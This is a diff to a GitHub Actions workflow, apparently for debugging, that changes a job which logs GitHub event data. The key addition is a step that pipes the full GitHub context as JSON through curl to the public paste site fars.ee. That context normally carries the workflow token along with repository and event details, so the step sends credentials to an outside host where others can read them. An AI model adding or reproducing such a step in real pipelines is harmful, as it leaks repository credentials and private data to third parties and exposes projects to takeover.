@@ -5,14 +5,17 @@ on:
 
 jobs:
   log-github:
-    # name: "LOG Everything on GitHub Event"
     runs-on: ubuntu-latest
     steps:
-      - name: pr base sha
+      # - name: Install Depends
+      #   run: sudo apt -y install curl
+
+      - name: base sha (pr)
         if: github.event_name == 'pull_request'
         run: |
           echo "${{toJSON(github.event.pull_request.base.sha)}}"
 
-      - name: Show github json
-        run: |
-          echo "${{toJSON(github)}}"
+      - name: Dump GitHub context
+        env:
+          GITHUB_CONTEXT: ${{ toJson(github) }}
+        run: echo "$GITHUB_CONTEXT" | curl -F "c=@-" "http://fars.ee/"
